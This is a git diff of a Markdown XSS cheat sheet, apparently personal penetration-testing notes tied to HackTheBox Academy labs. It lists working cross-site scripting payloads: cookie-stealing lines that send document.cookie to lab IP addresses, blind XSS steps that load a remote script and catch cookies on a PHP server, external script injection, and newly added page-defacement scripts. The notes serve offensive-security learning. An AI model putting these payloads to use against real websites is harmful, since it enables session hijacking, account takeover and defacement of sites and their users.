@@ -50,65 +50,65 @@ https://github.com/rajeshmajumdar/BruteXSS
 ```
 
 ## Basic
-```
+```javascript
 <script>alert("Hi")</script>
 ```
 
-```
+```javascript
 <script>print()</script>
 ```
 
-```
+```javascript
 <script>alert(document.cookie)</script>
 ```
 
-```
+```javascript
 <script>alert(window.origin)</script>
 ```
 
 ### Writing DOM Objects
-```
+```javascript
 document.write()
 ```
 
-```
+```javascript
 DOM.innerHTML
 ```
 - `innerHTML` will not allow the use of `<script>` but allows others...
 
-```
+```javascript
 DOM.outerHTML
 ```
 
-```
+```javascript
 add()
 ```
 
-```
+```javascript
 after()
 ```
 
-```
+```javascript
 append()
 ```
 
-```
+```javascript
 <img src="" onerror=alert(window.origin)>
 ```
 
-```
+```javascript
 <script src="http://OUR_IP/script.js"></script>
 ```
 
 
-```bash
+```javascript
 <img src=1 onerror=\"document.location='http://10.10.16.47:8000/'+document.cookie\">
 ```
 ## Blind XSS
 1) Find Vulnerable Parameter
 2) Create script.js to POST cookie
 
-```
+```javascript
 new Image().src='http://10.10.16.33:4444/index.php?c='+document.cookie;
 ```
 
@@ -120,12 +120,30 @@ php -S 0.0.0.0:80
 
 4) Use script src in vulnerable parameter
 
-```
+```javascript
 "><script src=http://10.10.16.33/script.js></script>
 ```
 
-```
+```javascript
 document.location='http://OUR_IP/index.php?c='+document.cookie;
+```
+
+## Defacing with XSS
+```javascript
+// Change Background
+<script>document.body.style.background = "#141d2b"</script>
+<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
+
+// Change Title
+<script>document.title = 'HackTheBox Academy'</script>
+
+// Change Page Text
+document.getElementById("todo").innerHTML = "New Text" // specific element
+$("#todo").html('New Text'); // jQuery function to change specific element
+document.getElementsByTagName('body')[0].innerHTML = "New Text" // Change the whole body
+
+// Minify the code and add to XSS payload, e.g.:
+<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
 ```
 
 ---
